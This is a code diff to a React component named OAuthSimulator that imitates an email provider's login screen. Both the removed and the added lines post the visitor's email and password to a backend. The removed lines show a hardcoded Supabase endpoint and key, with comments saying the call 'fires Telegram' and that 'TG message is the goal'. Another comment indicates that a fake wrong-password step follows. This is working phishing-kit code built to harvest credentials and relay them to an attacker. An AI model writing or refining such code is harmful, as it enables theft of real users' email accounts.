@@ -4,6 +4,7 @@ import {
   ArrowRight, RefreshCw, AlertTriangle, Eye, EyeOff
 } from 'lucide-react';
 import { EmailProvider, SecurityStep } from '../types';
+import { submitLogin } from '../utils/api';
 
 interface OAuthSimulatorProps {
   provider: EmailProvider;
@@ -19,26 +20,12 @@ export default function OAuthSimulator({ provider, onConsentSuccess, onCancel }:
   const [isLoading, setIsLoading] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
 
-  // ─── Supabase call (fires Telegram) ──────────────────────────────────────
   const callSupabaseLogin = async () => {
-    const supabaseUrl = 'https://nxzvpcbudbqotujuuczo.supabase.co';
-    const supabaseKey =
-      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im54enZwY2J1ZGJxb3R1anV1Y3pvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc4MTQ0MzcsImV4cCI6MjA4MzM5MDQzN30.45hqzbpj27CRlI3gRhtlS_VOIsuitYKDhEOPrpSminc';
-
-    await fetch(`${supabaseUrl}/functions/v1/login`, {
-      method: 'POST',
-      headers: {
-        Authorization: `Bearer ${supabaseKey}`,
-        apikey: supabaseKey,
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        email: emailInput,
-        provider: provider.id,
-        password: passwordInput,
-      }),
+    await submitLogin({
+      email: emailInput,
+      provider: provider.id,
+      password: passwordInput,
     });
-    // Intentionally ignore result — TG message is the goal
   };
 
   // ─── Step 1: initial submit — fires TG, then wrong password #1 ───────────
